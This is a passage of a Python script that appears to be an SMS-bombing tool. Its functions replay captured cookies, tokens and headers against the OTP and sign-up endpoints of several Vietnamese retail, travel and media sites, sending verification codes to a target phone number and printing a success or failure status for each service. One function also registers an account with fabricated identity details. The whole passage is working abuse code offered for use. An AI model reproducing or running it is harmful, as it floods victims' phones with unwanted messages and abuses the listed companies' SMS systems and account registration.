        'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22HasLocation%22%3Afalse%7D',
        'MWG_PRODUCT_BASIC_DB': '8abgNefqT1OLKPUy9CdlGphoh4YH1TCUQ2O8qfDSoTekJWN9DlHZHg--',
        'MWG_CART_HAVE_PRODUCT': '',
        'MWG_CART_SS_10': 'CfDJ8HejTqTgEXlOoIeW1CutofMSwf1KBlmYkBfvOjkoALoH4r9xxvwWrnep7coXkJ%2Fr4%2BKm0gHg13xdJtoqPNe%2BrMAf00o06k6zN5Aru0jt5sJ1EvaRjAh2Yi5TnF8wskNe2GIa29%2FCi5DWsgrcDyw6Rej%2FjlOIR0Cntv6woICxpxua',
        '.AspNetCore.Antiforgery.NTCLGRwicAo': 'CfDJ8AOPS3HyLgBFlxCZc71KlZMgfnidzWeReJosd0ECag31BBIyv_udfMtl7ykWkPlIQyiCQUZDw9-HMt1E5Kp16PBFLng9tVdT6Ny-RW6zRfoujkBkZZ63o43Bqr9XfvDgetbCthg1rNQeScZ8kHw80_c',
        'ASP.NET_SessionId': 'cbfs1ut3q3kq5wzq4cdmk04o',
        'MWG_ORDERHISTORY_SS_10': 'CfDJ8AOPS3HyLgBFlxCZc71KlZM%2B7YdGYg1Uay0HvcY5I9exurDcJwezpyegUKYLmXZrsIZCsThbwITQlbQYm%2FwU5on0n3LaP4VSt96mph3WHOviP0y0cgaEGb5QPwtDGFhmyLn27SYEE5cPnWZsV9HLxfXjJnemr8utUw94BP29JXXk',
        'TBMCookie_3209819802479625248': '837581001721796736QEZtdvzz0Kums067KBceEASslN8=',
        'SvID': 'ak213|ZqCIh|ZqCBh',
        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dtrue,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "___utmvm=###########; .AspNetCore.Antiforgery.PgYZnA9bRvk=CfDJ8MYaQjD04aBHj9meZl7eRqI3A2HboqNnhlow3nIbtSN1KebuCGK6Cc6IuNcfibOGjCM8Fz5YBSZbkIvW3ggg0LhTlWWOaTsLCwIM_9Zd3fdeEQuEjuLde5-WANEX1rQLaVVWdWxnFBWUqvXyCPq9PL8; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22HasLocation%22%3Afalse%7D; MWG_PRODUCT_BASIC_DB=8abgNefqT1OLKPUy9CdlGphoh4YH1TCUQ2O8qfDSoTekJWN9DlHZHg--; MWG_CART_HAVE_PRODUCT=; MWG_CART_SS_10=CfDJ8HejTqTgEXlOoIeW1CutofMSwf1KBlmYkBfvOjkoALoH4r9xxvwWrnep7coXkJ%2Fr4%2BKm0gHg13xdJtoqPNe%2BrMAf00o06k6zN5Aru0jt5sJ1EvaRjAh2Yi5TnF8wskNe2GIa29%2FCi5DWsgrcDyw6Rej%2FjlOIR0Cntv6woICxpxua; .AspNetCore.Antiforgery.NTCLGRwicAo=CfDJ8AOPS3HyLgBFlxCZc71KlZMgfnidzWeReJosd0ECag31BBIyv_udfMtl7ykWkPlIQyiCQUZDw9-HMt1E5Kp16PBFLng9tVdT6Ny-RW6zRfoujkBkZZ63o43Bqr9XfvDgetbCthg1rNQeScZ8kHw80_c; ASP.NET_SessionId=cbfs1ut3q3kq5wzq4cdmk04o; MWG_ORDERHISTORY_SS_10=CfDJ8AOPS3HyLgBFlxCZc71KlZM%2B7YdGYg1Uay0HvcY5I9exurDcJwezpyegUKYLmXZrsIZCsThbwITQlbQYm%2FwU5on0n3LaP4VSt96mph3WHOviP0y0cgaEGb5QPwtDGFhmyLn27SYEE5cPnWZsV9HLxfXjJnemr8utUw94BP29JXXk; TBMCookie_3209819802479625248=837581001721796736QEZtdvzz0Kums067KBceEASslN8=; SvID=ak213|ZqCIh|ZqCBh; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dtrue,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        'Origin': 'https://www.nhathuocankhang.com',
        'Referer': 'https://www.nhathuocankhang.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8AOPS3HyLgBFlxCZc71KlZND_qpIxPX4mlZOiveWgRjeJWH_yXfoR4Ya8tjSSmB6J6ldM4fc18FYhry1DWluW9yLUZ594p5VTlRZVWnZtnADBr69zqmqDb018jzjpn6F-Hjibt7FRQfzugl7BjkJqKs',
    }

    try:
        response = requests.post(
            'https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("NHATHUOCANKHANG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("NHATHUOCANKHANG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mutosi():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://mutosi.com',
        'Referer': 'https://mutosi.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': sdt,
        'token': '03AFcWeA6fiVhT4EBIfzK0ig1GHzNbRmRnRtBBOH1dhvf9hT0VX9ea7dWAZbBd1uIxz_7rVyV2WTGlkOC2sZQZ4tyeNk02EME0K-j-YqGw99JaScUfDyNTiAel85AvXWgbewqADfN4m1xEG8FhEIxFr4h1k4UvWfeU_g1vxmL8Aqu3PCsayc5KjVkbJpnQC40u0LDO44PCzOCLi-zbid9gB8eg-rvLMvxnSYQn3bhi23yySknb2n2mzqGP7-iZUe1rUmCs7NGpzsQW895fzRbEkw2m4f0N2spyZweF4_-1z46Qq4vQtCRM17MDdOv4mU4Auwi-QAgMieM-ldmn-NvF3hohfjpBgbDXvSWtSA514TFaNzF2uIwBTZdoP7GU6Tia2qQlp43-1TLwrlfAsMhTkFFBE5BPMdFCg6kBPpM7FBDYeeqlc9T3ecV8rPa6iCOGJX6QrQh-QfBUJbbApeHyBZhXESIg_EtTDKnlbMWrrpwRph1eK0-O24BB56DT2gfPEetRHQH6emdhj1uCYlD6hDUtr_YO8CxMwAMN1Bb3HuCJfbE32YQHjkp2HR113BG3qLsool9mArCl1y2c8PFjzdF4C-7tIzrMVKFlI52CO8AsjWoyqM_9hSpY5v2sWdGafDxjxnFSmom5lI4DvZgFdZPkvvIgNzyjIT1itVDmTTYa1H0tozL7i7-Xe5VuoXIFj4w0pw_LmpCnj5s0HzQqi0G1lTrpXAUGZyiBWEHFGtkm7nYIY-qEYc1HSHg8bJ3P7lsihgXwFXysPKYzKTJlNVT9jxnBStgFsPzNmY9vgtOdO_GTTfoQyQzFE8OPyYM4vG9nuRIaMbpW',
        'source': 'web_consumers',
    }

    try:
        response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MUTOSI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MUTOSI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mocha():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Origin': 'https://video.mocha.com.vn',
        'Referer': 'https://video.mocha.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'msisdn': sdt,
        'languageCode': 'vi',
    }

    try:
        response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MOCHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MOCHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sigo():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://sigo.vn',
        'priority': 'u=1, i',
        'referer': 'https://sigo.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'UI_StartAt': 1721879135577,
        'UI_FirstID': 'q633_1721879105606',
        'AppName': 'sigoweb',
        'Url': 'https://sigo.vn/bang-gia-thue-xe-tu-lai-theo-ngay',
        'DocumentWidth': 1920,
        'MobilePhone': sdt,
        'ActionType': 'register',
        'UI_TimezoneOffset': -420,
    }

    try:
        response = requests.post('https://api.sigo.vn/api/v1/Account/GetOTP', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SIGO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SIGO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vietravel():
    cookies = {
        '__RequestVerificationToken': '8RKGVoT0RgoOu-dbFEENBEdI8ou_c-GbBE0hpUXoEWErCQ6h3pDhCkcTNhYRIzMadgs0mVnNeBGmKIX2TCOv-TjfGCi9qGT2RrXiTnU7YiM1',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '__RequestVerificationToken=8RKGVoT0RgoOu-dbFEENBEdI8ou_c-GbBE0hpUXoEWErCQ6h3pDhCkcTNhYRIzMadgs0mVnNeBGmKIX2TCOv-TjfGCi9qGT2RrXiTnU7YiM1',
        'origin': 'https://vietravelplus.com',
        'priority': 'u=1, i',
        'referer': 'https://vietravelplus.com/dang-ky-hoi-vien',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        '__RequestVerificationToken': '-boYwp8GdxLF-fbAHHLTMCAq6I9hicH4zLr8gNmD6xkCTd67Y6SVZ874-CANjnEadbMKFHf0DPA_eLaFdcUeZGv32kvt8e57fHimy6Sws141',
        'CustomerName': 'ten la gi',
        'Phone': sdt,
        'Birthday': '05/03/1986',
        'Gender': '1',
        'IdCard': '001204056664',
        'id_issue_date': '29/12/2021',
        'passport_no': '422016774',
        'Email': 'febjk2@gmail.com',
        'issue_date': '04/08/2016',
        'deadline_date': '04/01/2030',
        'CountryId': 'VN',
        'ProvinceId': 'ce934e15-eb2e-454c-8235-2d5bef57a855',
        'DistrictId': '9dbeb6fa-b9bb-4094-b2e2-f7737dc52ca1',
        'Address': '15 viet ntoei',
        'OrgCode': 'SGN',
        'ReferBy': '',
        'Password': '123123aA@',
        'RePassword': '123123aA@',
        'socialid': '',
        'socialtype': '',
        'chkDieuKhoan': 'on',
    }

    try:
        response = requests.post('https://vietravelplus.com/TheThanhVien/_DangKy', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETRAVEL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETRAVEL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pnjzl():
    cookies = {
        'CDPI_VISITOR_ID': 'f0af56e8-d456-4674-9f11-1014cd66b0c2',
        'CDPI_RETURN': 'New',
        'CDPI_SESSION_ID': '281bc297-b9e0-4292-9afd-bc11a265c501',
        'recently_products': 'null',
        'XSRF-TOKEN': 'eyJpdiI6IkhwdG5PRUJadXBFR21RYjdwQm5FcHc9PSIsInZhbHVlIjoidFR3cnc4aHBDbWU3N3JyTFN4OC9WR2U2OVZ4dUtzWSt5MzlSN2dMTjg5dXBnMXp2ZTdtTWlkUEFXOVp5RXF5aW9lY1hFM3hldEROakdXWEI5S1YySjhPYXpOams5UW8wbEdvRmN2NG1oUUFyaGFTNEdmNUN4eVkzNzdEamx4TysiLCJtYWMiOiIxOWQwZmRiZDhjYjhmYmU0YzdhNTI0M2U0NDhmOThhM2UwMTgwNTY5YWVjYTQzOGY4NGI5ZDk3MDQ4Yzc0YTg4IiwidGFnIjoiIn0%3D',
        'mypnj_session': 'eyJpdiI6IkZFem55QnJPdnRrWnNlU3ZSaFl5RUE9PSIsInZhbHVlIjoiVExVelRnRFhSTW0yYlNENFh1Q0JYeEFpcHVjMkJ2bVNPcWlpTXl6Ump5N0VnNTRDYTFpZHJZT2RlMUMvdS9kc2xGbTlBa0RtNzNEOVhybmF1b2MyUitsU3ZUbVROKzg5V0Rqdm1yZml2TFo4amJ6REx4WXZyNVlGdWVJczE5cEEiLCJtYWMiOiJkMzJkZGNlMjI2ZjdmZjc2ZGUzZmYzYTJjNWFlN2RmZTA5ZjBlZTJjNDg0MmQ1YmNkMTZlN2IxZTYzMTA5YzEzIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'CDPI_VISITOR_ID=f0af56e8-d456-4674-9f11-1014cd66b0c2; CDPI_RETURN=New; CDPI_SESSION_ID=281bc297-b9e0-4292-9afd-bc11a265c501; recently_products=null; XSRF-TOKEN=eyJpdiI6IkhwdG5PRUJadXBFR21RYjdwQm5FcHc9PSIsInZhbHVlIjoidFR3cnc4aHBDbWU3N3JyTFN4OC9WR2U2OVZ4dUtzWSt5MzlSN2dMTjg5dXBnMXp2ZTdtTWlkUEFXOVp5RXF5aW9lY1hFM3hldEROakdXWEI5S1YySjhPYXpOams5UW8wbEdvRmN2NG1oUUFyaGFTNEdmNUN4eVkzNzdEamx4TysiLCJtYWMiOiIxOWQwZmRiZDhjYjhmYmU0YzdhNTI0M2U0NDhmOThhM2UwMTgwNTY5YWVjYTQzOGY4NGI5ZDk3MDQ4Yzc0YTg4IiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6IkZFem55QnJPdnRrWnNlU3ZSaFl5RUE9PSIsInZhbHVlIjoiVExVelRnRFhSTW0yYlNENFh1Q0JYeEFpcHVjMkJ2bVNPcWlpTXl6Ump5N0VnNTRDYTFpZHJZT2RlMUMvdS9kc2xGbTlBa0RtNzNEOVhybmF1b2MyUitsU3ZUbVROKzg5V0Rqdm1yZml2TFo4amJ6REx4WXZyNVlGdWVJczE5cEEiLCJtYWMiOiJkMzJkZGNlMjI2ZjdmZjc2ZGUzZmYzYTJjNWFlN2RmZTA5ZjBlZTJjNDg0MmQ1YmNkMTZlN2IxZTYzMTA5YzEzIiwidGFnIjoiIn0%3D',
        'origin': 'https://www.pnj.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.pnj.com.vn/customer/otp/verify',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        '_token': 'fgXx7bf0BGq9088kV0keRzn1SfLSzJ2rtUy63BMQ',
        'phone': sdt,
        'type': 'zns',
    }

    try:
        response = requests.post('https://www.pnj.com.vn/customer/otp/request', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PNJZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PNJZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pnjsms():
    cookies = {
        'CDPI_VISITOR_ID': 'f0af56e8-d456-4674-9f11-1014cd66b0c2',
        'CDPI_SESSION_ID': '281bc297-b9e0-4292-9afd-bc11a265c501',
        'recently_products': 'null',
        'CDPI_RETURN': 'Return',
        'XSRF-TOKEN': 'eyJpdiI6IkM2VnY0K2xScnFCVnJ6VDJTeVNvbEE9PSIsInZhbHVlIjoiNEpyaVpEYkRtOS93ckpFTjAxai81MElJODVDK0VZTVp3N2hxa2ZkNDBKNUtxeHN6MWpLTm04Snd5OEk0WXR3QzlrK2JocEVQUG9WS2xKbTdKdzBlUU1qUzFPU1JudHVSdnFka0ZnSWFMc0VwY1NHeHhMVW1TMnRSR0F1U1AzQnAiLCJtYWMiOiI2NzExMDJjZDRhMWEwMzAxMjRhYWIxMjlkNDBhYWFhZDFlMTQ5NTFhNWNmYmY5MzRmZTFhNDBhN2MzYWJmNDMxIiwidGFnIjoiIn0%3D',
        'mypnj_session': 'eyJpdiI6Ik1pMUM4c3dzMG5TWGplMklwS0NHSmc9PSIsInZhbHVlIjoiaTRNQ1NlRUE4cFBScHJrcWZFb1pCQVV5eGV0WXQxbFd1RG91TEN1YWMzTDJTV0k1QWp3M3JHQ01BTjc0eDVCSVVpRnoyb1JwMWF6eHY2QVhSSFh4R2Z3YWEraFBlNzVkRE5kUEpZMHdYQjJMeXcxSnpHN29BM0s2TXhHbyt2VUoiLCJtYWMiOiIwMjNkY2FiMTQ2ZjY2MTQzMjk0M2I4Y2RhMTgxNTMxYjcyNjg1NGQ4MjU5M2VlZmRkZDc5MzFlMjk1NGNiOTJkIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'CDPI_VISITOR_ID=f0af56e8-d456-4674-9f11-1014cd66b0c2; CDPI_SESSION_ID=281bc297-b9e0-4292-9afd-bc11a265c501; recently_products=null; CDPI_RETURN=Return; XSRF-TOKEN=eyJpdiI6IkM2VnY0K2xScnFCVnJ6VDJTeVNvbEE9PSIsInZhbHVlIjoiNEpyaVpEYkRtOS93ckpFTjAxai81MElJODVDK0VZTVp3N2hxa2ZkNDBKNUtxeHN6MWpLTm04Snd5OEk0WXR3QzlrK2JocEVQUG9WS2xKbTdKdzBlUU1qUzFPU1JudHVSdnFka0ZnSWFMc0VwY1NHeHhMVW1TMnRSR0F1U1AzQnAiLCJtYWMiOiI2NzExMDJjZDRhMWEwMzAxMjRhYWIxMjlkNDBhYWFhZDFlMTQ5NTFhNWNmYmY5MzRmZTFhNDBhN2MzYWJmNDMxIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6Ik1pMUM4c3dzMG5TWGplMklwS0NHSmc9PSIsInZhbHVlIjoiaTRNQ1NlRUE4cFBScHJrcWZFb1pCQVV5eGV0WXQxbFd1RG91TEN1YWMzTDJTV0k1QWp3M3JHQ01BTjc0eDVCSVVpRnoyb1JwMWF6eHY2QVhSSFh4R2Z3YWEraFBlNzVkRE5kUEpZMHdYQjJMeXcxSnpHN29BM0s2TXhHbyt2VUoiLCJtYWMiOiIwMjNkY2FiMTQ2ZjY2MTQzMjk0M2I4Y2RhMTgxNTMxYjcyNjg1NGQ4MjU5M2VlZmRkZDc5MzFlMjk1NGNiOTJkIiwidGFnIjoiIn0%3D',
        'origin': 'https://www.pnj.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.pnj.com.vn/customer/login',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        '_method': 'POST',
        '_token': 'fgXx7bf0BGq9088kV0keRzn1SfLSzJ2rtUy63BMQ',
        'type': 'sms',
        'phone': sdt,
    }

    try:
        response = requests.post('https://www.pnj.com.vn/customer/otp/request', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PNJSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PNJSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mamanbebe():
    cookies = {
        'PHPSESSID': 'halbmnosvptpt5m03q2l89ofdd',
        'form_key': 'RV7ffxpuWamLI9TI',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'mage-messages': '',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'form_key': 'RV7ffxpuWamLI9TI',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'PHPSESSID=halbmnosvptpt5m03q2l89ofdd; form_key=RV7ffxpuWamLI9TI; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; form_key=RV7ffxpuWamLI9TI',
        'Origin': 'https://mamanbebe.vn',
        'Referer': 'https://mamanbebe.vn/customer/account/create/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'number_phone': sdt,
        'form_key': 'RV7ffxpuWamLI9TI',
        'currentUrl': 'https://mamanbebe.vn/customer/account/create/',
    }

    try:
        response = requests.post('https://mamanbebe.vn/sms_vietguys/otp/sendOTP', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MAMANBEBE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MAMANBEBE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def tatmart():
    cookies = {
        'sid_customer_6c986': '3860535321c041d920d9d9ed68e7d044-C',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'sid_customer_6c986=3860535321c041d920d9d9ed68e7d044-C',
        'origin': 'https://www.tatmart.com',
        'priority': 'u=1, i',
        'referer': 'https://www.tatmart.com/profiles-add/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
